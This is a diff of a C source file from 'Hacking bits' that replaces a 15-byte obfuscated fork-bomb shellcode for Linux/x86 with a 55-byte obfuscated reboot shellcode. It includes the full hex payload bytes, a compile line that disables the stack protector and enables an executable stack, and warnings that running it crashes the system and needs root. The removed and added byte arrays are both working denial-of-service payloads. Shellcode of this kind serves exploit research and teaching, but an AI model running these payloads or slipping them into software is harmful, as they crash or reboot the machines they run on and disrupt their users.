@@ -1,6 +1,6 @@
 /*
 
- Mutated Fork Bomb Shellcode - C Language - Linux/x86
+ Mutated Reboot Shellcode - C Language - Linux/x86
  Copyright (C) 2013 Geyslan G. Bem, Hacking bits
 
    http://hackingbits.com
@@ -23,17 +23,18 @@
 
 /*
 
-   mutated_fork_bomb_shellcode
+   mutated_reboot_shellcode
 
-  * 15 bytes
+  * 55 bytes
   * null-free
   * mutated isn't polymorphic (shellcode does not replicate itself to be called polymorphic)
 
 
-   # gcc -m32 -fno-stack-protector -z execstack mutated_fork_bomb_shellcode.c -o mutated_fork_bomb_shellcode
+   # gcc -m32 -fno-stack-protector -z execstack mutated_reboot_shellcode.c -o mutated_reboot_shellcode
 
    Testing
    * Only run it in a Virtual Machine!!! Your system will crash. Use at your own risk!
+   * To work properly, you must be su!
 
 */
 
@@ -43,8 +44,12 @@
 
 unsigned char shellcode[] = \
 
-"\x31\xff\xeb\x01\xe8\xb2\x1d\x97\x83\xe8"
-"\x1b\xcd\x80\xeb\xf1";
+"\x29\xff\x74\x01\xe8\x83\xc7\x24\x97\xeb"
+"\x01\xe1\xcd\x80\xeb\x01\xff\x6a\x29\x59"
+"\xeb\x01\x01\xbb\x67\x45\x23\x01\xba\xca"
+"\x9b\xc2\xff\x31\xda\x75\x01\xe7\x87\xda"
+"\x8d\x41\x2f\x8d\x89\x40\x19\x12\x28\xeb"
+"\x02\xe8\x01\xcd\x80";
 
 
 main ()
